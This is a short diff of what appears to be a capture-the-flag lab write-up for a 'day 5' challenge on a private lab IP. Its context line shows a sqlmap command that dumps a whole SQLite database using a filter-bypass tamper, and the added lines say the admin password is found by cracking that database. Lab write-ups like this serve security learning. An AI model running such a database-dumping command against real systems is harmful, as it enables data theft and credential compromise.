@@ -24,4 +24,5 @@ IP: 10.10.99.195:8000
 - `sqlmap -r day5_burp --batch --dump-all --tamper=space2comment --dbms=sqlite`
 - FLAG!!
 
-
+### Admin Password
+- It's there once you cracked the database ;)
